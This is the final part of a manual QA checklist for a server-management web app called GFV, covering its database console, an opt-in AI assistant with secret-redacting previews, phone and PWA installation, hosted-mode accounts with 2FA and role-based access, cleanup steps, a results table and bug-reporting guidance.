- [ ] Run `SELECT version();` and a `SELECT * FROM some_table LIMIT 5;`. `NULL` values are shown as NULL.
- [ ] **Read-only by default.** Run `CREATE TABLE gfv_test (id int);`: it must be **refused** by the database with a
      clear error, not run.
- [ ] Switch on **allow changes**: a hint about writes appears. Run the same statement. It needs a confirmation,
      then succeeds. Delete the table afterwards (`DROP TABLE gfv_test;`) with the same steps.
- [ ] **500-row cap**: run `SELECT generate_series(1, 1000);`. Only 500 rows come back, and the result says it was
      truncated.
- [ ] Run `SELECT pg_sleep(30);`: a statement should time out after about 15 seconds.
- [ ] Try two statements in one box (`SELECT 1; SELECT 2;`). Only one statement at a time is supported, so expect a
      clear message.
- [ ] Wrong password: a clear error. Delete the connection (**Delete connection**).
- [ ] Confirm nothing is listening on the database port from the internet: GFV used the SSH tunnel.

## 23. Assistant

**What it is.** An optional helper that explains things, always with a preview of exactly what would be sent.
**Needs.** Nothing to try the preview. An API key (Anthropic) or an OpenAI-compatible server (for example Ollama) to
actually send.

- [ ] Open **Assistant**. It is **off** by default and shows its settings.
- [ ] **Turn the assistant on**. Choose a **Provider** (Anthropic with your own key, or an OpenAI-compatible server and
      its **Server address**) and a **Model**. Save the settings (the key is stored encrypted).
- [ ] Type a message in the **Your message** box that includes a fake secret, for example
      `my password=hunter2 and token=abc123def456`. Press **Preview**.
- [ ] The preview shows the exact text that would be sent, with the secret **removed**, and the
      **destination** (for example `api.anthropic.com`, or `127.0.0.1:11434 (stays on this computer)` for Ollama).
- [ ] Nothing has left your computer yet. Press **Send** only if you are happy with it. The answer appears, and what was
      sent is exactly what you previewed.
- [ ] Ask it to suggest an action (for example "how do I see disk usage?"). If it **proposes an action**, the proposal
      opens the normal review window, with the **real** risk and the **real** commands. It cannot run anything by itself.
- [ ] Cause an action to fail, then use **Explain this error** in the run window: it fills the Assistant with the
      failing command and its output, still behind a preview.
- [ ] Turn the assistant off again. Delete the key if you do not want it stored.
- [ ] Coverage note: the assistant has so far been tested against fake providers that speak the same protocols, not
      against the real Anthropic API or a real Ollama server. Reports from real providers are especially welcome.

## 24. Phone layout and installing as an app

**What it is.** A launcher for small screens, and an installable app (PWA).
**Needs.** A way to reach GFV from the phone: hosted mode (section 25), or a tunnel. GFV on your computer only
listens on loopback.

**Phone layout** (also testable by making a desktop browser window narrower than about 768 px)

- [ ] The desktop becomes a launcher grid with one full-screen app at a time and a bottom bar.
- [ ] Open the Terminal: a row of extra keys (Ctrl, Esc, arrows) sits above the keyboard.
- [ ] Open Files, Monitor, Services. Check that buttons are big enough to tap and nothing is cut off.
- [ ] Use the bottom bar to go back, and to open the Learn panel as a full-screen sheet.
- [ ] Rotate the phone and check again.

**Installing**

- [ ] In Chrome or Edge on a computer or Android, open the hosted address over **HTTPS**. The address bar offers
      **Install**. Install it. GFV opens in its own window with its icon.
- [ ] On iPhone, use Share, then Add to Home Screen.
- [ ] Stop the GFV service on the VPS (`sudo systemctl stop gfv`), then open the installed app: you should see a clear
      page ("GFV is not running") and not a browser error. Start the service again.
- [ ] The app never caches API responses. After signing out, nothing from your servers should be viewable offline.

## 25. Hosted mode: accounts, 2FA, Users

**What it is.** GFV running on a server with accounts, 2FA, roles, per-server access and an audit log.
**Needs.** GFV running in hosted mode behind HTTPS (see [HOSTED.md](HOSTED.md)). Two browsers, or one normal and one
private window.

**First sign-in and account**

- [ ] Open the https address: it asks for the setup token and the first administrator's username and password
      (12 or more characters).
- [ ] Try a short password: it must be refused.
- [ ] Create the master password for the vault. Add a server.
- [ ] Open the **Control Center** and your account: the **Account** window shows your username, whether 2FA is on, a
      **Change password** section, and the devices you are signed in on.

**2FA**

- [ ] **Set up 2FA**: add the secret to your authenticator app, type the 6-digit code, press **Confirm**, and **save the
      recovery codes**.
- [ ] Sign out and sign in again: the password, then the code, is needed.
- [ ] Type a wrong code a few times: the delay doubles (throttling).
- [ ] Use one **recovery code** to sign in. Try the same code again: it must not work a second time.
- [ ] A code that was just used must not work again straight away (replay protection).
- [ ] Turn 2FA off and back on.

**Users app (administrators only)**

- [ ] Open **Users**. As an administrator it lists accounts and has a **New account** form: username, **Role**
      (Administrator or Member), and which servers a member may use.
- [ ] Create a **Member** and give them access to **one** server only.
- [ ] In a private window, sign in as that member.
  - They see **only** their server in the picker.
  - There is **no Users app** in their Dock, and Recipes, Jobs, server management and the Assistant's settings are not
    available to them (these are administrator-only).
  - They can use the Terminal, Files, Monitor and similar on **their** server.
  - They **cannot** see or reach the other server. Try to guess it: open the other server's address in the API
    (for example paste the API path in the address bar). It must be refused.
- [ ] As the member, the vault is locked until an administrator unlocks it, and they cannot create or unlock it.
- [ ] Back as administrator, change the member's server access: the change applies the next time they load.
- [ ] **Reset 2FA** for the member, and set a new password. After a password change, every device of that member is
      signed out.
- [ ] Open the **Audit log**: sign-ins (and failed ones), account changes, every change request, file downloads,
      terminal opens and every action run, with the server and the risk. There must be **no** passwords, SQL text,
      request bodies or keystrokes in it.
- [ ] Try to delete or demote the **last administrator**: it must be refused.

**Transport and sessions**

- [ ] Reach the site by plain `http://` on the domain: sign-in must be refused (it requires HTTPS).
- [ ] Check the cookie in your browser's developer tools: `HttpOnly`, `Secure` and `SameSite=Strict`.
- [ ] Leave a session idle past 12 hours (or revoke a device in the Account window): it must sign out.
- [ ] After restarting the service (`sudo systemctl restart gfv`): the vault is locked again, and an administrator must
      unlock it.

**Limited coverage so far:** only one real deployment (nginx with Let's Encrypt) has been tried. Other reverse proxies
(for example Caddy), IPv6, long idle sessions and many simultaneous users have not been exercised. Reports are
welcome.

## Cleaning up afterwards

- [ ] Delete test folders and files: `~/gfv-test`, `/tmp/gfv-recipe-test`, `~/backup-test`, `~/gfv-projects`.
- [ ] Remove test containers (`docker rm -f gfv-test-web`) and any App Store apps you installed.
- [ ] Remove the test backup job and its timer.
- [ ] Remove test sites and certificates in Network. Restore nginx's default if you changed it.
- [ ] Turn the firewall back to how it was. Check `sudo ufw status`.
- [ ] Undo any SSH hardening you applied that you did not want. Check you can still SSH in.
- [ ] Uninstall tools you installed only for testing (Dev Hub), if you like.
- [ ] Remove test recipes and jobs. Remove test servers from GFV.
- [ ] Remove demo accounts in Users. Turn off or delete the Assistant key.
- [ ] GFV's own journal and history (and the server-side `~/.gfv` folders) now contain your test runs. Delete `~/.gfv/snapshots`, `~/.gfv/guard`, `~/.gfv/apps` and `~/.gfv/backups` on the servers if
      you want them empty.
- [ ] If you used a throwaway data folder, delete it: `rm -rf /tmp/gfv-test`.

## A results table

Copy this into your notes and fill it in. Also record the GFV version (`gfv --version`), the date, local or hosted
mode, and the provider and distribution of each server you used.

| Area                  | Pass / fail | What happened, and the server and provider |
| --------------------- | ----------- | ------------------------------------------ |
| 1 Desktop and shell   |             |                                            |
| 2 Servers             |             |                                            |
| 3 Terminal            |             |                                            |
| 4 Files               |             |                                            |
| 5 Editor              |             |                                            |
| 6 Monitor             |             |                                            |
| 7 Services            |             |                                            |
| 8 Docker              |             |                                            |
| 9 Dev Hub             |             |                                            |
| 10 Snapshots          |             |                                            |
| 11 Actions            |             |                                            |
| 12 Learn and Lessons  |             |                                            |
| 13 Recipes            |             |                                            |
| 14 Jobs               |             |                                            |
| 15 Network            |             |                                            |
| 16 Projects           |             |                                            |
| 17 Server Map         |             |                                            |
| 18 Firewall and guard |             |                                            |
| 19 Security           |             |                                            |
| 20 Backups            |             |                                            |
| 21 App Store          |             |                                            |
| 22 Database           |             |                                            |
| 23 Assistant          |             |                                            |
| 24 Phone and PWA      |             |                                            |
| 25 Hosted mode        |             |                                            |

## Reporting a problem

Open an issue on the repository (there is a bug report template). It helps a lot if you include:

- what you did, step by step, and what you expected to happen;
- what actually happened, with a screenshot if you can;
- the server's provider and distribution (`cat /etc/os-release`) and the GFV version (`gfv --version`);
- whether it is local or hosted mode;
- the exact error text. Please remove passwords, tokens, private keys and your server addresses first.

Do not post anything that looks like a secret. If you think you found a security problem, do not open a public issue:
[SECURITY.md](../SECURITY.md) explains how to report it privately.
